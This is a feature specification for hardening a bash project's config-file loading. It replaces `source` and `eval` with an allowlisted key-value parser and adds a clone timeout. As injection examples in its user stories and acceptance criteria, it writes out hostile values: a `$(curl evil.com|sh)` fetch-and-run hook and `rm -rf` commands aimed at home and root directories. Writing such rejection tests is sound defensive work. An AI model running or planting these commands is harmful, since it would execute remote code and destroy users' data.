---
prd_reference: docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md
triad:
  pm_signoff:
    agent: product-manager
    date: 2026-05-04
    status: APPROVED
    notes: "All 5 vuln_ids, 8 US (1:1 mapping to PRD US-256-1..8), 9 FRs (mapped to PRD FR-1..9), 6 NFRs, 15 SCs (vuln closure + primitive correctness + adversarial rejection + clone timeout + perf benchmark + ADR/governance/release + cross-cutting), and 14 edge cases faithfully translated. Q-1..Q-6 PRD adjudications all folded in (single-PR default with Day-5 conversion lever; whitelist required at sites A+D, optional at site B; <key_case> upper/lower only; AOD_FETCH_TIMEOUT=0 rejected; sibling-file placement; tiered perf ladder with awk micro-opt rejected; ADR dual-commit Proposed→Accepted). F-1 contract amendment (B-2 Path R-2 — aod_init_read_validated rejects $/\\/backtick at prompt boundary) properly threaded through AC-4.7 and CHANGELOG note in AC-8.4. Acceptance Criteria follow Given/When/Then; 7 [MANUAL-ONLY] markers correctly placed (post-merge release-please verification, /security re-scan, strace/dtruss platform-specific). Zero NEEDS CLARIFICATION markers. Out-of-Scope enumerates F-1 (shipped), F-3/F-4/F-5 (deferred), schema preservation, rejected config formats. Dependencies + Assumptions complete. Spec ready for /aod.project-plan. Full review: .aod/results/product-manager.md."
  architect_signoff: null  # Added by /aod.project-plan
  techlead_signoff: null   # Added by /aod.tasks
---

# Feature Specification: Source-Pattern Hardening (BLP-02 Wave 2)

**Feature Branch**: `256-source-pattern-hardening`
**Created**: 2026-05-04
**Status**: PM Approved (ready for /aod.project-plan)
**Input**: User description: "PRD: 256 - source-pattern-hardening. Source PRD: docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md. PRD has full Triad sign-off (PM APPROVED, Architect APPROVED Pass 1.5, Team-Lead APPROVED_WITH_CONCERNS Pass 1). Closes 5 /security vulns across the bash source/eval surface and adds a portable git clone timeout."

## Context Anchor

This spec implements [PRD 256](../../docs/product/02_PRD/256-source-pattern-hardening-2026-05-04.md) — **Wave 2 / Feature 2 of 5** in BLP-02 (Enterprise Hardening Initiative), opened 2026-05-02 in response to Daniel Wood's LinkedIn note. F-2 builds the canonical config-load library primitive (`aod_template_load_kv_file`), refactors four `source` / `eval` call sites onto it, and bundles a portable `git clone` timeout — closing five `/security` findings (2 HIGH + 2 MEDIUM + 1 LOW) in a single squash-merged PR with public ADR-040 and a release-please trigger.

**Out of scope (deferred or already shipped)**:

- F-1 (#248, delivered 2026-05-04) closed the substitution-surface side of the same posture-response cadence; F-2 closes the parallel **config-load surface**.
- F-3 (SECURITY.md + private vulnerability reporting), F-4 (hardened Claude permissions baseline), F-5 (pre-commit secret-scanning defaults) — Wave 3+4 features.
- `finding.yaml` schema changes — preserved unchanged (NFR-005, ninth feature in a row).
- New JSON / TOML / YAML config formats — explicitly REJECTED in ADR-040 §Alternatives Considered (ADR-040 items 1, 2).

## User Scenarios & Testing *(mandatory)*

### User Story 1 — Adopter running `init.sh` against a tampered stack-pack `defaults.env` (Priority: P1)

An adopter runs `init.sh` against a stack pack contributed by the community (or a stack pack whose `defaults.env` has been tampered with via supply-chain compromise). The adopter expects init to **parse `defaults.env` as KV pairs against an allowlist, NOT execute it as bash** — so a malicious line like `CUSTOM_HOOK="$(curl evil.com|sh)"` (or a more subtle injection like `TECH_STACK="nextjs"; rm -rf ~/Projects`) is rejected with a clear error and never executes.

**Why this priority**: This is the directly-flagged HIGH-severity vulnerability (TACHI-VULN-6f5a95085056, A03 Injection). Stack packs are the **documented extension point** for tachi adopters; a contributed pack from the community (or a tampered checkout) can place arbitrary bash in `defaults.env` and have it execute at init time with the user's full shell environment. The current contract on `defaults.env` is "should be `KEY=value` lines" — a comment, not an enforcement.

**Independent Test**: Place a fixture stack pack at `stacks/malicious-pack/defaults.env` containing `CUSTOM_HOOK="$(touch /tmp/F-256-pwned)"` (single line, otherwise valid syntax). Run `SELECTED_PACK=malicious-pack init.sh` against the fixture; confirm init exits with code 8 and a message naming the line number and offending content. Verify `/tmp/F-256-pwned` is never created. Re-run against a valid fixture (`TECH_STACK=nextjs`, `CLOUD_PROVIDER=vercel`); confirm normal load.

**Acceptance Scenarios**:

1. **Given** a fixture stack pack at `stacks/malicious-pack/defaults.env` containing `CUSTOM_HOOK="$(touch /tmp/F-256-pwned)"`, **When** `init.sh` runs with `SELECTED_PACK=malicious-pack`, **Then** init exits with code 8 with a message naming the line number and offending content (`[aod] ERROR: malformed line N in stacks/malicious-pack/defaults.env: <truncated>`), and `/tmp/F-256-pwned` is never created.
2. **Given** a fixture stack pack with valid keys (`TECH_STACK=nextjs`, `CLOUD_PROVIDER=vercel`, `TECH_STACK_DATABASE=supabase`, `TECH_STACK_VECTOR=pgvector`, `TECH_STACK_AUTH=supabase`), **When** `init.sh` runs against it, **Then** caller-scope variables `STACK_TECH_STACK=nextjs`, `STACK_CLOUD_PROVIDER=vercel`, etc. are populated and init proceeds.
3. **Given** a fixture stack pack containing an unknown key (`MALICIOUS_KEY=value` alongside the canonical keys), **When** `init.sh` runs against it, **Then** init exits with code 8 and a message naming the disallowed key (`[aod] ERROR: disallowed key 'MALICIOUS_KEY' in <path> (line N); allowed: <list>`).

---

### User Story 2 — Maintainer adding a new config-file site in the future (Priority: P1)

A maintainer of tachi adds a new config-file load site somewhere in the bash library (e.g., a future `personalization.local.env` for adopter-private overrides, or a stack-pack-extension config introduced by a Wave 5+ feature). The maintainer expects a **one-function-call API** to load the file safely — so they don't have to invent a new validation pattern, and so the surface remains canonical.

**Why this priority**: Architectural soundness. F-1 set the precedent that *one canonical pattern beats four bespoke validators*. Without F-2's library, every future config-load site re-invents validation; the post-F-2 surface has exactly one entry point that any new site adopts.

**Independent Test**: Author a pretend new feature that needs to load a config file. Confirm the maintainer can wire it via `aod_template_load_kv_file <path> <prefix> <whitelist>` in 1-3 lines. Confirm ADR-040 §Decision documents the canonical pattern; new call sites are reviewed against ADR-040 conformance.

**Acceptance Scenarios**:

1. **Given** the post-F-2 repository, **When** a maintainer locates `.aod/scripts/bash/template-config-load.sh`, **Then** the file exists and exposes `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]`.
2. **Given** the post-F-2 repository, **When** a maintainer reads ADR-040 §Decision, **Then** the canonical read-buffer → strict-KV-regex → `printf -v` pattern is documented as the entry point for new config-load sites.
3. **Given** a future PR adds a new `source <config_file>` invocation in `.aod/scripts/bash/`, **When** code review runs against ADR-040, **Then** the reviewer cites ADR-040 conformance and routes the new site through `aod_template_load_kv_file` instead.

---

### User Story 3 — Adopter running `/aod.update` weekly against malformed `aod-kit-version` (Priority: P1)

A tachi adopter runs `/aod.update` weekly (per consumer guide cadence). The adopter expects config-file loading to **fail loudly** if `aod-kit-version` contains malformed content from a partial fetch / disk corruption / supply-chain compromise of the upstream tag — so they never silently `source` arbitrary content from a corrupted state.

**Why this priority**: Multi-hop chain risk. `/aod.update` runs weekly; a corrupted `aod-kit-version` (with a single line like `version='1.0'; rm -rf ~/Projects`) would execute the rm before the per-field validators at `template-git.sh:568+` see the shape failure. Closes TACHI-VULN-bf5496e9fcdf (HIGH).

**Independent Test**: Place a fixture `.aod/aod-kit-version` containing `version='1.0'; touch /tmp/F-256-pwned` and run `aod_template_read_version_file`. Confirm function returns exit 8 with a message naming the line and content. Verify `/tmp/F-256-pwned` is never created. Re-run against a valid fixture (`version='4.28.0'`, `sha=abc123`, `updated_at=...`, `upstream_url=...`, `manifest_sha256=...`); confirm normal load and per-field validators run as before.

**Acceptance Scenarios**:

1. **Given** a fixture `.aod/aod-kit-version` containing `version='1.0'; touch /tmp/F-256-pwned`, **When** `aod_template_read_version_file` is invoked, **Then** the function returns exit 8 with `[aod] ERROR: malformed line N in <path>: <truncated>`, and `/tmp/F-256-pwned` is never created.
2. **Given** a fixture `.aod/aod-kit-version` containing only valid lowercase fields (`version='4.28.0'`, `sha=abc123def456`, `updated_at=2026-05-04T12:00:00Z`, `upstream_url=https://github.com/...`, `manifest_sha256=...`), **When** `aod_template_read_version_file` is invoked, **Then** the load succeeds and the per-field regex validators at `template-git.sh:568+` run against the loaded values.
3. **Given** a fixture `.aod/aod-kit-version` containing a bare `version=` line (empty unquoted value — required by the contract for non-tagged installs), **When** `aod_template_read_version_file` is invoked, **Then** the load succeeds with `version=""` (empty assignment), and the per-field validator handles the empty-version case as it does today.
4. **Given** the inner round-trip block at `aod_template_write_version_file:485-515` (the writer's belt-and-braces validation), **When** the writer wraps a sequence of valid field values, **Then** the round-trip `aod_template_load_kv_file "$tmp_path" "" "" lower` invocation succeeds and post-load missing-field detection runs unchanged.

---

### User Story 4 — Adopter running `/aod.update` in CI with hanging upstream (Priority: P2)

An adopter runs `/aod.update` in a CI runner where the upstream remote hangs (DNS resolves but TCP doesn't, HTTPS handshake stalls, or upstream is intentionally rate-limiting). The adopter expects the fetch to **time out at 60 seconds** (or their configured `AOD_FETCH_TIMEOUT`) rather than hanging indefinitely — so the CI job fails fast with a clear timeout error and doesn't tie up a runner for the full job-budget window.

**Why this priority**: Availability — closes TACHI-VULN-851fd6a21ba9 (LOW). Bundled in F-2 because it lives in `template-git.sh` which is being touched anyway for the `source aod-kit-version` fix — coherent surface, single PR.

**Independent Test**: Spin up a TCP listener that accepts but never responds (test fixture: a Python `socket.bind()` that does nothing); point `aod_template_fetch_upstream` at it with `AOD_FETCH_TIMEOUT=3`; confirm the function returns exit 9 within ~3-4 seconds; confirm the partial checkout at `destdir` is removed. Re-run with `AOD_FETCH_TIMEOUT=10`; confirm the same fixture times out at ~10s, not 60s.

**Acceptance Scenarios**:

1. **Given** a hanging-upstream fixture (TCP listener that accepts but never responds), **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=3` against the fixture, **Then** the function returns exit 9 within ~3-4 seconds, the partial checkout at `destdir` does not exist, and stderr contains `[aod] ERROR: upstream fetch timed out after 3s for url=... ref=...`.
2. **Given** the same hanging fixture, **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=10`, **Then** the function returns exit 9 at ~10s, not 60s.
3. **Given** an `AOD_FETCH_TIMEOUT=0` invocation, **When** `aod_template_fetch_upstream` is called, **Then** the function returns exit 1 with `[aod] ERROR: AOD_FETCH_TIMEOUT must be a positive integer (got: 0)` (per Q-3 footgun-rejection ruling).
4. **Given** a non-numeric `AOD_FETCH_TIMEOUT=abc` invocation, **When** `aod_template_fetch_upstream` is called, **Then** the function returns exit 1 with the same shape of error.
5. **Given** a fast-clone fixture (clone completes in <1s), **When** `aod_template_fetch_upstream` is invoked with `AOD_FETCH_TIMEOUT=60`, **Then** the function returns exit 0, no zombie watchdog process remains, and the watchdog `sleep 60` is killed by the post-wait `kill "$watchdog_pid"` cleanup.

---

### User Story 5 — Security reviewer auditing the `source`/`eval` surface for residuals (Priority: P1)

A security reviewer evaluates whether tachi's bash library has any residual unsanitized `source` / `eval` of untrusted content. The reviewer expects every `source` of a config-file path AND every `eval` of a key-derived assignment to either (a) be removed in favor of `aod_template_load_kv_file`, or (b) be explicitly justified in ADR-040 §Out-of-Scope — so the surface has exactly one canonical config-load pattern and the residual `source` / `eval` count is zero (or explicitly enumerated).

**Why this priority**: Architectural-soundness audit — the post-F-2 grep result is the procurement-stopping question for an enterprise security architect. The pattern's value compounds across BLP-02 and beyond if the post-merge tree is **clean**.

**Independent Test**: Run `grep -rn '\bsource\b\|\beval\b' .aod/scripts/bash/ scripts/init.sh` post-merge. Confirm:
- (a) Zero unauthorized `source` of a config-file path remains.
- (b) Zero `eval` of a key-derived assignment remains in `template-substitute.sh`.
- (c) Only the explicit `source .aod/scripts/bash/template-*.sh` library-loading sources at the top of `init.sh` and inside other library files remain (loading TRUSTED in-repo bash code, not untrusted config).

**Acceptance Scenarios**:

1. **Given** the post-F-2 `.aod/scripts/bash/template-substitute.sh`, **When** a reviewer runs `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh`, **Then** the result is **`0`** (zero `eval` invocations remain).
2. **Given** the post-F-2 `scripts/init.sh`, **When** a reviewer runs `grep -n 'source.*defaults\.env' scripts/init.sh`, **Then** the result is **zero matches** (no `source` of a `defaults.env` path remains).
3. **Given** the post-F-2 `.aod/scripts/bash/template-git.sh`, **When** a reviewer runs `grep -n 'source.*aod-kit-version\|source.*\$path\|source.*\$tmp_path' .aod/scripts/bash/template-git.sh`, **Then** the result is **zero matches** for the version-file paths.
4. **Given** the post-F-2 ADR-040 §Out-of-Scope, **When** a reviewer reads the section, **Then** the residual `source .aod/scripts/bash/template-*.sh` library-loading sources are explicitly enumerated and justified (loading trusted, in-repo bash code; not in F-2's scope).

---

### User Story 6 — Enterprise security architect doing pre-sales review (Priority: P2)

An enterprise security architect evaluating tachi for procurement expects to see one coherent, traceable artifact bundle per closed posture finding — a single PR, a public ADR, a CHANGELOG entry, `DETECTED → REMEDIATED` transitions in the vulnerabilities log, and an automated release-please trigger that publishes the fix in the next release. The architect uses this artifact ratio as a proxy for **posture-claims-to-evidence ratio** and looks for *repeatable* cadence, not a singleton response.

**Why this priority**: F-2 is the second visible posture commit demonstrating the BLP-02 cadence (F-1 was the first). Aligns with Constitution Principle VIII (Posture-as-Evidence) and supports tachi's source-of-truth positioning for enterprise-buyer pre-sales review.

**Independent Test**: After merge, verify (a) the PR squash-merge title matches `feat(256): ...`, (b) ADR-040 exists in `docs/architecture/02_ADRs/`, (c) `.security/vulnerabilities.jsonl` shows 5 `REMEDIATED` events with merge SHA + timestamp, (d) release-please opens a release PR within ~30 seconds post-merge, (e) the F-1+F-2 sequence is visible as a two-feature cadence pattern in the artifact trail.

**Acceptance Scenarios**:

1. **Given** F-2 is squash-merged into `main`, **When** an architect inspects the merge commit, **Then** the title is `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout` (Conventional-Commits-formatted).
2. **Given** the post-merge state, **When** an architect locates the artifact bundle for F-2, **Then** they find: ADR-040 in `docs/architecture/02_ADRs/`, a CHANGELOG entry under v4.x with migration note (per NFR-3), 5 `REMEDIATED` events in `.security/vulnerabilities.jsonl` referencing the merge SHA, and a release-please PR that opened within ~30s of the F-2 squash-merge.
3. **Given** release-please did NOT open a PR within ~30s (e.g., upstream cadence variance), **When** the post-merge belt-and-suspenders verification step runs, **Then** an empty `feat(256): source-pattern hardening — release marker` commit is pushed to `main` and a release-please PR opens within the next ~30s.
4. **Given** the architect inspects the F-1+F-2 sequence in `git log --oneline main`, **When** they look at the closed-loop cadence (LinkedIn → /security → BLP → ADR → release), **Then** both features show the same artifact pattern (PR + ADR + REMEDIATED events + release-please PR + CHANGELOG migration note) — visible as repeatable cadence, not a singleton response.

---

### User Story 7 — Maintainer reviewing `template-substitute.sh` for `eval` removal (Priority: P2)

A maintainer reviews `template-substitute.sh` post-merge to confirm the `eval` surface is zero. The maintainer expects `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` to return **`0`** — so any future PR introducing a new `eval` to that file fails review on the canonical-pattern rule.

**Why this priority**: Closes TACHI-VULN-9a7512071b4a (MEDIUM). The current four `eval` sites at `:217, :249, :536, :558` flow `$key` from the literal canonical-12 array (low residual exploitability), but the **language-level affordance** that `eval` gives an attacker is unbounded; any future refactor immediately weaponizes the pattern.

**Independent Test**: Run `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` post-merge. Confirm result is `0`. Add a CI lint rule (Stream 5 deliverable) that fails PR review if a new `eval` is introduced to this file. Confirm the round-trip writer-reader semantics are preserved (`aod_template_init_personalization` writes a snapshot; `aod_template_load_personalization_env` re-reads it identically).

**Acceptance Scenarios**:

1. **Given** the post-F-2 `.aod/scripts/bash/template-substitute.sh`, **When** a reviewer runs `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh`, **Then** the result is **`0`**.
2. **Given** the post-F-2 `template-substitute.sh`, **When** a reviewer reads the read-side dynamic-lookup pattern, **Then** the four eval sites at `:217, :249, :536, :558` are replaced — `:217`/`:536` use `local var_name="$key"; local val="${!var_name:-}"`; `:558` uses `local val="${!var_name}"` (NO `:-` default per H-4 strict semantic equivalence); `:249` uses `printf -v "AOD_PERSONALIZATION_${key}" '%s' "$val"`.
3. **Given** the writer escape pass at `template-substitute.sh:566-571` (the `\\`/`"`/`$`/backtick escape block), **When** a reviewer reads the post-F-2 file, **Then** the four-line escape block is **removed** (per B-2 Path R-2); the writer just emits `printf '%s="%s"\n' "$key" "$val" >> "$tmp_path"` directly.
4. **Given** the F-1 `aod_init_read_validated` validator in `.aod/scripts/bash/init-input.sh`, **When** a reviewer reads the post-F-2 file, **Then** the validator is amended to additionally reject `$`, `\`, backtick at the prompt boundary (per F-1 contract amendment in F-2's PR).
5. **Given** a CI lint rule landed in `tests/scripts/test_template_substitute_lint_no_eval.py`, **When** a future PR introduces an `eval` to `template-substitute.sh`, **Then** the lint test fails and PR review blocks merge until the `eval` is removed.

---

### User Story 8 — Adopter whose `/aod.update` runs in a TOCTOU race-prone environment (Priority: P2)

An adopter runs `/aod.update` in an environment where another process or the user could race against the personalization snapshot read (e.g., a backup tool that touches `.aod/personalization.env` periodically, or a multi-agent setup where two `/aod.update` invocations could interleave). The adopter expects the personalization-env load to **read the file once into a buffer** and validate-then-assign from the buffer — NOT do a check-then-use-twice pattern — so an attacker (or a benign racing process) cannot swap the file between validation and use.

**Why this priority**: Closes TACHI-VULN-4dc6cf8f88ea (MEDIUM). The current `aod_template_load_personalization_env:162-209` implements a textbook TOCTOU — subshell-validate at lines 187-191 then caller-source at line 209.

**Independent Test**: Verify post-F-2 `aod_template_load_personalization_env` reads `.aod/personalization.env` exactly once via `strace -e openat` (Linux) or `dtruss` (macOS). Run a fixture test that swaps the file content via a forked process between any two operations within the loader; confirm that swap cannot affect the values that land in caller scope (because the loader operates on the in-memory buffer, not on the file path, after the initial `cat`).

**Acceptance Scenarios**:

1. **Given** the post-F-2 `aod_template_load_personalization_env` is invoked, **When** `strace -e openat` (Linux) traces the call, **Then** the trace shows exactly **one** `openat(...)` of the personalization.env path within the function body (the `cat "$path"` in `aod_template_load_kv_file` step 3).
2. **Given** a fixture test that runs `aod_template_load_personalization_env` in one process while a second process swaps `.aod/personalization.env` content between any two operations of the loader, **When** the loader returns, **Then** the values in caller scope match the file's content **at the moment of `cat`** — not the post-swap content.
3. **Given** the post-F-2 `aod_template_load_personalization_env` body, **When** a reviewer reads the function, **Then** it consists of ~7 lines of delegation to `aod_template_load_kv_file "$path" "AOD_PERSONALIZATION_" AOD_CANONICAL_PLACEHOLDERS` (down from the 47 lines of subshell-validate-then-caller-source code at `:162-209`).
4. **Given** ADR-040 §Decision, **When** a reviewer reads it, **Then** the residual race window is documented explicitly (the `cat` opens-once mitigation collapses the race window from "between two operations" to "before cat opens"; not zero, but bounded).

---

### Edge Cases

- **File ending without trailing newline**: a fixture file ending without an LF byte (e.g., `printf 'KEY=value' > fixture.env`) MUST parse correctly — the `<<< "$content"` here-string adds a trailing newline back so `while IFS= read -r line` iterates the last line regardless.
- **CRLF line endings (Windows-edited config)**: a fixture file containing `KEY=value\r\n` (CRLF instead of LF) MUST parse correctly — the per-line CRLF strip (`line="${line%$'\r'}"`) tolerates Windows editors.
- **Leading whitespace per line**: a fixture file containing `  KEY=value` (indented for readability) MUST parse correctly — the leading-whitespace strip (per B-3 path-a, mirrors `init.sh:217`) tolerates adopters who indented for readability. Lines containing only whitespace are skipped as blank.
- **Comment lines and blank lines**: lines beginning with `#` (after leading-whitespace strip) and empty lines are skipped — not validated as KV lines.
- **Bare `KEY=` (empty unquoted value)**: required by the version-file contract (`aod-kit-version` line 1 is literally `version=` when installed off a non-tagged commit). The unquoted-value character class uses `*` (zero-or-more, per B-1 resolution), NOT `+`, so the bare form passes validation.
- **Empty `path` argument**: `aod_template_load_kv_file "" "STACK_"` returns exit 1 with `[aod] ERROR: aod_template_load_kv_file requires <path>`.
- **Invalid `var_prefix` that is not bash-identifier-shaped**: `aod_template_load_kv_file <path> "1bad-prefix"` returns exit 1 (defensive identifier check per H-1).
- **Malformed `<key_case>` parameter**: any value other than `upper` or `lower` (e.g., `mixed`, `Mixed`, `UPPER`, empty string when 4th arg supplied) returns exit 1 (per Q-2.5 ruling — only two sharp modes).
- **File-absent**: `aod_template_load_kv_file <missing_path> ...` returns exit 3 with `[aod] ERROR: config file does not exist: <path>`.
- **Bash 3.2 vs bash 4+ behavior**: the new library MUST run under macOS-default bash 3.2.57 AND Linux bash 5.x. No associative arrays, no `mapfile` / `readarray`, no `${var,,}` lowercase expansion. `${!var}` indirect expansion is bash 3.2 compatible for **scalars only** (used in FR-004 read-side replacement).
- **Watchdog process-leak on outer-script SIGINT (per L-1)**: if the outer script (`init.sh` or `update.sh`) is interrupted (Ctrl+C) BEFORE the watchdog fires, the watchdog subshell becomes orphaned and continues running until `$AOD_FETCH_TIMEOUT` elapses. Mitigation: `trap 'kill "$watchdog_pid_local" 2>/dev/null; trap - INT TERM EXIT' INT TERM EXIT` in `aod_template_fetch_upstream`.
- **Fast clone race (clone finishes before watchdog wakes)**: the post-wait `kill "$watchdog_pid" 2>/dev/null` cleans up the still-sleeping watchdog. No zombie processes.
- **F-1 prompt validator amendment ripple**: F-1's `aod_init_read_validated` is amended IN F-2's PR (NOT F-1's) to additionally reject `$`, `\`, backtick at the prompt boundary, enabling B-2 Path R-2 (writer escape pass removal). Adopters whose `PROJECT_NAME`/`PROJECT_DESCRIPTION` contain these characters at re-init see prompt rejection. CHANGELOG note tied to F-2 documents this one-time contract amendment.
- **Performance regression on bounded N**: the new parser does explicit per-line regex match + per-line whitelist lookup + `printf -v` assignment, where the old `source` was a single `bash` interpretation pass. On a 5-line config file this is sub-millisecond either way; the canonical fixture set (4 files, totalling <50 lines) is bounded; the absolute regression is bounded. NFR-004 mandates Stream 1 benchmarks with measurable escalation thresholds (per Q-5 ruling).
- **`/security` re-scan finding new vuln in touched files**: post-merge `/security` re-scan (Test-7) MUST produce zero new findings within `scripts/init.sh`, `.aod/scripts/bash/template-git.sh`, `.aod/scripts/bash/template-substitute.sh`, `.aod/scripts/bash/template-config-load.sh`. If a new finding surfaces, the closing operator escalates to PM before marking F-2 delivered.
- **release-please cadence variance**: the post-merge release-please PR may not open within 30s on every release. The belt-and-suspenders empty-marker commit pattern (per F-212 incident lessons) closes this gap.

## Requirements *(mandatory)*

> **Acceptance Criteria Rule**: Each AC begins with **Given** and follows Given/When/Then structure. ACs that cannot be automated are marked `[MANUAL-ONLY] <reason>` inline.

### Functional Requirements

- **FR-001**: System MUST add a new sourced library file at `.aod/scripts/bash/template-config-load.sh` exposing one canonical function `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]` with read-buffer → strict-KV-regex → `printf -v` assignment behavior.
  - **AC-1.1**: **Given** the post-F-2 repository, **When** a reviewer locates `.aod/scripts/bash/template-config-load.sh`, **Then** the file exists and exposes `aod_template_load_kv_file` callable when sourced.
  - **AC-1.2**: **Given** `aod_template_load_kv_file` is invoked with a valid 5-line KV file (`KEY=value`, `KEY="quoted"`, `KEY='single-quoted'`, `KEY=path/with/slashes`, `KEY=email@example.com`), **When** the function returns, **Then** caller-scope variables `${var_prefix}KEY` are populated with the literal values (quotes stripped), and exit code is 0.
  - **AC-1.3**: **Given** `aod_template_load_kv_file` is invoked with a file containing a malformed line (e.g., `KEY="$(rm -rf /)"`), **When** the function returns, **Then** the exit code is **8** with `[aod] ERROR: malformed line N in <path>: <truncated 80-char content>` printed to stderr, and **no** caller-scope variable is set (no partial assignment).
  - **AC-1.4**: **Given** `aod_template_load_kv_file` is invoked with a 3rd-arg whitelist array name and the file contains a key not in the whitelist, **When** the function returns, **Then** exit code is **8** with `[aod] ERROR: disallowed key '$KEY' in <path> (line N); allowed: <list>`.
  - **AC-1.5**: **Given** `aod_template_load_kv_file` is invoked with a whitelist and the file is missing a required key, **When** the function returns, **Then** exit code is **8** with `[aod] ERROR: required key '$MISSING_KEY' missing from <path>; expected: <list>`.
  - **AC-1.6**: **Given** `aod_template_load_kv_file` is invoked with `<key_case>=lower`, **When** the file contains lowercase keys (e.g., `version=4.28.0`), **Then** the lowercase regex variant `^[a-z_][a-z_0-9]*=...$` is applied and lowercase keys are accepted.
  - **AC-1.7**: **Given** `aod_template_load_kv_file` is invoked with `<key_case>=mixed` (or any value other than `upper`/`lower`), **When** the function is called, **Then** exit code is **1** (per Q-2.5 ruling — only two sharp modes).
  - **AC-1.8**: **Given** `aod_template_load_kv_file` is invoked with an empty `<path>`, **When** the function is called, **Then** exit code is **1** with `[aod] ERROR: aod_template_load_kv_file requires <path>`.
  - **AC-1.9**: **Given** `aod_template_load_kv_file` is invoked with a non-existent `<path>`, **When** the function is called, **Then** exit code is **3** with `[aod] ERROR: config file does not exist: <path>`.
  - **AC-1.10**: **Given** the post-F-2 library function body, **When** a reviewer searches for `eval`, **Then** the function body contains zero `eval` invocations.
  - **AC-1.11**: **Given** the bash 3.2 compatibility constraint, **When** the function runs under macOS bash 3.2.57, **Then** all primitives (`cat`, `printf -v`, `[[`, `=~`, here-string `<<<`, `${!var}`, command substitution `$(...)`) work correctly with no associative arrays / no `mapfile` / no `${var,,}`.

- **FR-002**: System MUST refactor `scripts/init.sh:106` to replace `source "stacks/$SELECTED_PACK/defaults.env"` with a call to `aod_template_load_kv_file "stacks/$SELECTED_PACK/defaults.env" "STACK_" STACK_PACK_ALLOWED_KEYS` (allowed-key whitelist `STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)`).
  - **AC-2.1**: **Given** the post-F-2 `scripts/init.sh`, **When** a reviewer runs `grep -n 'source.*defaults\.env' scripts/init.sh`, **Then** the result is **zero matches**.
  - **AC-2.2**: **Given** `init.sh` runs against a valid stack pack (`stacks/nextjs-supabase`), **When** the function call returns, **Then** caller-scope variables `STACK_TECH_STACK`, `STACK_TECH_STACK_DATABASE`, `STACK_TECH_STACK_VECTOR`, `STACK_TECH_STACK_AUTH`, `STACK_CLOUD_PROVIDER` are populated; downstream code that previously read `$TECH_STACK` (etc.) is migrated to read `$STACK_TECH_STACK` (rename pass).
  - **AC-2.3**: **Given** `init.sh` runs against a malicious stack pack containing `CUSTOM_HOOK="$(touch /tmp/F-256-pwned)"`, **When** the function call returns, **Then** init exits with code 8 with the named-line error, and `/tmp/F-256-pwned` is never created.
  - **AC-2.4**: **Given** the library is sourced at the top of `init.sh`, **When** a reviewer reads the source preamble, **Then** the source block is added alongside the existing `template-substitute.sh` and `init-input.sh` sources, with file-existence guard and clear error if missing.

- **FR-003**: System MUST refactor `.aod/scripts/bash/template-git.sh:561` (`aod_template_read_version_file`) AND the inner round-trip block at `:485-515` (`:501` in `aod_template_write_version_file`) to replace `source "$path"` (and `source "$tmp_path"`) with `aod_template_load_kv_file "$path" "" "" lower`. No whitelist (per Q-2 ruling — version file's well-documented 5 fields have stronger per-field validators at `:568+`); lowercase mode (per Q-2.5 ruling).
  - **AC-3.1**: **Given** the post-F-2 `template-git.sh`, **When** a reviewer runs `grep -n 'source.*"\$path"\|source.*"\$tmp_path"' .aod/scripts/bash/template-git.sh`, **Then** the result is **zero matches**.
  - **AC-3.2**: **Given** `aod_template_read_version_file` is invoked with a valid lowercase-fields fixture, **When** the function returns, **Then** caller-scope variables `version`, `sha`, `updated_at`, `upstream_url`, `manifest_sha256` are populated; the existing per-field validators at `:568+` run unchanged.
  - **AC-3.3**: **Given** `aod_template_write_version_file` is invoked, **When** the inner round-trip block at `:485-515` runs (the writer's belt-and-braces validation), **Then** the `aod_template_load_kv_file "$tmp_path" "" "" lower` invocation succeeds for valid output and exits 8 for malformed; the post-load missing-field detection runs unchanged.
  - **AC-3.4**: **Given** a fixture `aod-kit-version` with line 1 = `version=` (empty unquoted — the non-tagged-commit case), **When** the load runs, **Then** the bare-form passes the regex's zero-or-more quantifier (per B-1) and `version=""` is assigned.

- **FR-004**: System MUST replace four `eval` invocations in `.aod/scripts/bash/template-substitute.sh` (read-side `:217, :536, :558` and write-side `:249`) with bash 3.2-compatible alternatives (`${!var_name:-}` / `${!var_name}` indirect expansion for read-side; `printf -v` for write-side). Post-refactor, `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` MUST return `0`.
  - **AC-4.1**: **Given** the post-F-2 `template-substitute.sh:217`, **When** a reviewer reads the read-side dynamic-lookup block, **Then** the eval is replaced with `local var_name="$key"; local val="${!var_name:-}"` (default-to-empty preserved).
  - **AC-4.2**: **Given** the post-F-2 `template-substitute.sh:249`, **When** a reviewer reads the write-side dynamic-assignment block, **Then** the eval is replaced with `printf -v "AOD_PERSONALIZATION_${key}" '%s' "$val"`.
  - **AC-4.3**: **Given** the post-F-2 `template-substitute.sh:536`, **When** a reviewer reads the second read-side dynamic-lookup block, **Then** the eval is replaced with `local var_name="$key"; local val="${!var_name:-}"`.
  - **AC-4.4**: **Given** the post-F-2 `template-substitute.sh:558`, **When** a reviewer reads the third read-side dynamic-lookup block, **Then** the eval is replaced with `local var_name="$key"; local val="${!var_name}"` (NO `:-` default per H-4 strict semantic equivalence).
  - **AC-4.5**: **Given** the post-F-2 `template-substitute.sh`, **When** a reviewer runs `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh`, **Then** the result is **`0`**.
  - **AC-4.6**: **Given** the post-F-2 writer at `template-substitute.sh:566-571`, **When** a reviewer reads it, **Then** the four-line `\\`/`"`/`$`/backtick escape block is **removed** (per B-2 Path R-2); the writer emits `printf '%s="%s"\n' "$key" "$val" >> "$tmp_path"` directly.
